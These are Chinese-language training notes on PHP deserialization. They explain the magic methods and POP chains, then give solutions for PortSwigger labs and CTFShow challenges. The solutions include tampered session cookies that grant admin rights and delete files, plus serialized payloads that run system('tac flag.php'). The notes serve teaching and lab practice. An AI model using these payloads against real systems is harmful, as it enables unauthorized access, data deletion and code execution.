# 知识点

1、WEB攻防-PHP反序列化-魔术方法&触发规则
2、WEB攻防-PHP反序列化-POP链构造&黑白盒

# 反序列化
## 1 .何为反序列化操作 - 类型转换
- PHP & JavaEE & .NET & Python
  ![](imaages\75Pasted image 20250411195153.png)
### 序列化：
对象转换为数组或字符串等格式
### 反序列化：
将数组或字符串等格式转换成对象
```php
serialize() //序列化:将对象转换成一个字符串
unserialize() //反序列化:将字符串还原成一个对象
```
### PHP反序列化数据格式


![](imaages\75Pasted image 20250411195203.png)

### 开发中反序列化和序列化存在的原因：
 方便代码在数据传输中的完整性和可移植性
## 2 .常见 PHP 魔术方法-对象逻辑
```php
__construct(): //当对象new的时候会自动调用
__destruct()：//当对象被销毁时会被自动调用(两种情况，unset主动销毁或者程序结束)
__sleep(): //serialize()执行时被自动调用
__wakeup(): //unserialize()时会被自动调用
__invoke(): //当尝试以调用函数的方法调用一个对象时会被自动调用
__toString(): //把类当作字符串使用时触发
__call(): //调用某个方法;若不存在,则会去调用__call函数。
__callStatic(): //在静态上下文中调用不可访问的方法时触发
__get(): //读取对象属性时,若不存在，则会调用__get函数
__set(): //设置对象的属性时,若不存在,则调用__set函数。
__isset(): //在不可访问的属性上调用isset()或empty()触发
__unset(): //在不可访问的属性上使用unset()时触发
__set_state()，//调用var_export()导出类时，此静态方法会被调用
__clone()，//当对象复制完成时调用
__autoload()，//尝试加载未定义的类
__debugInfo()，//打印所需调试信息
```


![](imaages\75Pasted image 20250411195212.png)

### 0、`__construct()`: 当对象new的时候会自动调用；`__destruct()`,当对象被销毁时会被自动调用(反序列化必定调用)
`__construct()`: 当对象new的时候会自动调用；`__destruct()`,当对象被销毁时会被自动调用(两种情况，unset主动销毁或者程序结束)
```php
//__construct __destruct 魔术方法 创建调用__construct 2种销毁调用__destruct  
class Test{  
    public $name;  
    public $age;  
    public $sex;  
    // __construct：实例化对象时被调用.其作用是拿来初始化一些值。  
    public function __construct(){  
        echo "__construct 初始化魔术方法 被执行"."<br>";  
    }    // __destruct：当删除一个对象或对象操作终止时被调用。其最主要的作用是拿来做垃圾回收机制。  
    /*  
     * 当对象销毁时会调用此方法  
     * 一是用户主动销毁对象，二是当程序结束时由引擎自动销毁  
     */    function __destruct(){  
       echo "__destruct 类魔术方法执行完毕"."<br>";  
    }}  
  
 //主动销毁  
$test = new Test();  
unset($test);  
echo '第一种执行完毕'.'<br>';  
echo '----------------------<br>';  
  
  
//程序结束自动销毁  
$test = new test("xiaodi",31, 'Test String');  
echo '第二种执行完毕'.'<br>';
```

```
__construct 初始化魔术方法 被执行  
__destruct 类魔术方法执行完毕  
第一种执行完毕  
----------------------  
__construct 初始化魔术方法 被执行  
第二种执行完毕  
__destruct 类魔术方法执行完毕
```
### 1、`__sleep()`：serialize之前被调用，可以指定要序列化的对象属性。  
```php
//__sleep()：serialize之前被调用，可以指定要序列化的对象属性。  
class Test{  
    public $name;  
    public $age;  
    public $string;  
  
    // __construct：实例化对象时被调用.其作用是拿来初始化一些值。  
    public function __construct($name, $age, $string){  
        echo "__construct 初始化"."<br>";  
        $this->name = $name;  
        $this->age = $age;  
        $this->string = $string;  
    }  
    //  __sleep() ：serialize之前被调用，可以指定要序列化的对象属性  
    public function __sleep(){  
        echo "当在类外部使用serialize()时会调用这里的__sleep()方法<br>";  
        // 例如指定只需要 name 和 age 进行序列化，必须返回一个数值  
        return array('name', 'age','string');  
    }}  
  
$a = new Test("xiaodi",31, 'good teacher');  
echo serialize($a);
```

```text
__construct 初始化  
当在类外部使用serialize()时会调用这里的__sleep()方法  
O:4:"Test":3:{s:4:"name";s:6:"xiaodi";s:3:"age";i:31;s:6:"string";s:12:"good teacher";}
```

### 2、` __wakeup`：反序列化恢复对象之前调用该方法(反序列化必定调用)
`__wakeup`被执行意味着unserialize()必须被执行，同样意味着serialize()被执行，所以`__sleep`也被执行
```php
//__wakeup：反序列化恢复对象之前调用该方法  
class Test{  
    public $sex;  
    public $name;  
    public $age;  
  
    public function __construct($name, $age, $sex){  
        echo "__construct被调用!<br>";  
    }  
    public function __wakeup(){  
        echo "当在类外部使用unserialize()时会调用这里的__wakeup()方法<br>";  
    }}  
  
$person = new Test('xiaodi',31,'男');  
$a = serialize($person);  
unserialize($a);
```

```text
__construct被调用!  
当在类外部使用unserialize()时会调用这里的__wakeup()方法
```
### 3、`__INVOKE()`:将对象当做函数来使用时执行此方法
通常不推荐这样做。  
```php
//__INVOKE():将对象当做函数来使用时执行此方法，通常不推荐这样做。  
class Test{  
    // _invoke()：以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用  
    public function __invoke($param1, $param2, $param3)  
{  
        echo "这是一个对象<br>";  
        var_dump($param1,$param2,$param3);  
    }}  
  
$a  = new Test();  
//将对象当做函数调用 触发__invoke魔术方法  
$a('xiaodi', 31, '男');
```

```text
这是一个对象  
string(5) "joker" int(31) string(3) "男"
```

### 4、 ` __toString()`：把类当作字符串使用时触发
如果一个对象类中存在__toString魔术方法，这个对象类被当做字符串进行处理时，就会触发__toString魔术方法  
```php
//__toString()：如果一个对象类中存在__toString魔术方法，这个对象类被当做字符串进行处理时，就会触发__toString魔术方法  
class Test  
{  
    public $variable = 'good is string';  
  
    public function good(){  
        echo $this->variable . '<br />';  
    }  
    // 在对象当做字符串的时候会被调用  
    public function __toString(){  
        return '__toString魔术方法被执行！';  
    }}  
  
$a = new Test();  
//输出调用  
echo $a;
//__toString魔术方法被执行！
```

###  5、`_call() `调用某个方法;若不存在,则会去调用。
调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用__call函数。  
```php
//__CALL 魔术方法 调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用__call函数。  
class Test{  
  
    public function good($number,$string){  
        echo '存在good方法'.'<br>';  
        echo $number.'---------'.$string.'<br>';  
    }  
    // 当调用类中不存在的方法时，就会调用__call();  
    public function __call($method,$args){  
        echo '不存在'.$method.'方法'.'<br>';  
        var_dump($args);  
    }}  
  
$a = new Test();  
$a->good(1,'xiaodisec');  
//不存在xiaodi方法 触发__call魔术方法  
$b = new Test();  
$b->bad(899,'no');
```

```text
存在good方法  
1---------xiaodisec  
不存在bad方法  
array(2) { [0]=> int(899) [1]=> string(2) "no" }
```

### 6、`__get() `读取对象属性时,若不存在，则会调用__get函数
读取一个对象的属性时，若属性存在，则直接返回属性值；若不存在，则会调用`__get`函数  
```php
//__get() 魔术方法 读取一个对象的属性时，若属性存在，则直接返回属性值；若不存在，则会调用__get函数  
class Test {  
    public $n='属性存在、输出';  
  
  
    // __get()：访问不存在的成员变量时调用  
    public function __get($name){  
        echo '__get 不存在成员变量'.$name.'<br>';  
    }}  
  
$a = new Test();  
// 存在成员变量n，所以不调用__get  
echo $a->n;  
echo '<br>';  
// 不存在成员变量spaceman，所以调用__get  
echo $a->day;
```

```text
属性存在、输出  
__get 不存在成员变量day
```

### 7、 `_set()`设置对象的属性时,若不存在,则调用。
设置对象属性时即使不存在最后还是将值代入了
```php
//__set()魔术方法 设置一个对象的属性时， 若属性存在，则直接赋值；若不存在，则会调用__set函数。  
class Test{  
    public $noway=0;  
    // __set()：设置对象不存在的属性或无法访问(私有)的属性时调用  
    /* __set($name, $value)  
     * 用来为私有成员属性设置的值  
     * 第一个参数为你要为设置值的属性名，第二个参数是要给属性设置的值，没有返回值。  
     * */    public function __set($name,$value){  
        echo '__set 不存在成员变量 '.$name.'<br>';  
        echo '即将设置的值 '.$value."<br>";  
        $this->noway=$value;  
    }    public function Get(){  
        echo $this->noway;  
    }}  
$a = new Test();  
// 访问noway属性时调用，并设置值为899  
$a->noway  = 123;  
// 经过__set方法的设置noway的值为899  
$a->Get();  
echo '<br>';  
// 设置对象不存在的属性xiaodi  
$a->nomore= 31;  
// 经过__set方法的设置noway的值为31  
$a->Get();
```

```
123  
__set 不存在成员变量 nomore  
即将设置的值 31  
31
```
### 8、`__isset`对不可访问或不存在的属性调用isset()或empty()时被调用
```php
//__isset(): 检测对象的某个属性是否存在时执行此函数。当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用
class Person{
    public $sex; //公共的
    private $name; //私有的
    private $age; //私有的

    public function __construct($name, $age, $sex){
        $this->name = $name;
        $this->age = $age;
        $this->sex = $sex;
    }

    // __isset()：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。
    public function __isset($content){
        //echo "当在类外部使用isset()函数测定私有成员 {$content} 时，自动调用<br>";
        echo "__isset被执行了","<br>";
        return isset($this->$content);
    }
}

$person = new Person("xiaodi", 31,'男');
// public 成员
echo ($person->sex),"<br>";
 //private 成员
isset($person->name);
empty($person->name);
```

```text
男  
__isset被执行了  
__isset被执行了
```
###  9、`__unset()` 对不可访问或不存在的属性进行unset时被调用
```php
//__unset()：在不可访问的属性上使用unset()时触发 销毁对象的某个属性时执行此函数  
class Person{  
    public $sex;  
    private $name;  
    private $age;  
  
    public function __construct($name, $age, $sex){  
        $this->name = $name;  
        $this->age = $age;  
        $this->sex = $sex;  
    }  
    // __unset()：销毁对象的某个属性时执行此函数  
    public function __unset($content) {  
        echo "当在类外部使用unset()函数来删除私有成员 {$content} 时自动调用的<br>";  
        //echo isset($this->$content)."<br>";  
    }  
}  
  
$person = new Person("xiaodi", 31,"男"); // 初始赋值  
unset($person->sex);//不调用 属性共有 
unset($person->name);//调用 属性私有 触发__unset  
unset($person->age);//调用 属性私有 触发__unset
```

```text
当在类外部使用unset()函数来删除私有成员 name 时自动调用的  
当在类外部使用unset()函数来删除私有成员 age 时自动调用的
```
---
## 3.反序列化出现安全漏洞的原因：
### 原理：
未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。
在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。
```php
<? Php
Class B{
    Public $cmd='';
    Public function __destruct (){
        System ($this->cmd);
    }
}
//函数引用，无对象创建触发魔术方法
Unserialize ($_GET['x']);
```
## 4 . PHP反序列化漏洞利用- POP 链构造
### POP：
**面向属性编程**（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，序列化攻击都在 PHP 魔术方法中出现可利用的漏洞，因自动调用触发漏洞，但如关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造 POP 链寻找相同的函数名将类的属性和敏感函数的属性联系起来。
### PHP反序列化常见起点、跳板及终点
![](imaages\75Pasted image 20250411195230.png)

# 黑白盒案例
## 黑盒-portswigger-数据序列化
黑盒发现概率极低，偏近于无
靶场 https://portswigger.net/web-security/all-labs#insecure-deserialization
### Modifying serialized objects
反序列化实现越权01

数据包session使用base64解密为反序列化数据，重新构造发包即可
```json
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

修改访问地址为admin
等号转换为%3d
```json
GET /admin HTTP/2
Host: 0ad000d30425398881d208ee00f80036.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
```

删除用户
```json
GET /admin/delete?username=carlos HTTP/2
Host: 0ad000d30425398881d208ee00f80036.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
```

### Modifying serialized data types
反序列化实现越权02

解码后的反序列化数据
```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vra46av0urzkyvz9mf82utgjmnox915t";}
```
修改username为administer，access_token改为int类型
```json
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

等号转换为%3d
```json
GET /admin/delete?username=carlosHTTP/2
Host: 0ade0090035ca452808899ab00ac00d3.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```


### Using application functionality to exploit insecure deserialization
反序列化实现任意文件删除

删除用户时拦截
base64解码，等号转换为%3d%3d
```json
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ldk1qiwethcp3z3pccnwvqlotz29xdyp";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

重新构造
```json
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ldk1qiwethcp3z3pccnwvqlotz29xdyp";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
## 白盒-CTFSHOW-训练链构造
### 254-对象引用执行逻辑
```json
username=xxxxxx&password=xxxxxx
```
### 255-反序列化变量修改 1
CODE:
```PHP
<?php
class ctfShowUser{
    public $isVip=true;
}

$a=new ctfShowUser();
echo urlencode(serialize($a));
?>
```

```json
Get:username=xxxxxx&password=xxxxxx
Cookie:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```
### 256-反序列化参数修改 2
CODE:
```php
<?php
class ctfShowUser{
    public $username='xiaodi';
    public $password='xiaodisec';
    public $isVip=true;
}

$a=new ctfShowUser();
echo urlencode(serialize($a));

?>
```
```json
GET:username=xiaodi&password=xiaodisec
COOKIE:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xiaodi%22%3Bs%3A8%3A%22password%22%3Bs%3A9%3A%22xiaodisec%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```
### 257-反序列化参数修改&对象调用逻辑
CODE:
```php
<?php
class ctfShowUser{
    public $class = 'backDoor';
	public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    public $code='system("tac flag.php");';
    
}
echo urlencode(serialize(new ctfShowUser));
?>

```
```json
GET:username=xxxxxx&password=xxxxxx
COOKIE:user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D
```
### 258-反序列化参数修改&对象调用逻辑&正则
CODE:
```php
<?php
class ctfShowUser{
    public $class = 'backDoor';
    public function __construct(){
        $this->class=new backDoor();
    }
}
class backDoor{
    public $code="system('tac flag.php');";
}

$a=serialize(new ctfShowUser());
$b=str_replace(':11',':+11',$a);
$c=str_replace(':8',':+8',$b);
echo urlencode($c);
?>
```

```json
GET:username=xxxxxx&password=xxxxxx
COOKIE:user=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27tac+flag.php%27%29%3B%22%3B%7D%7D
```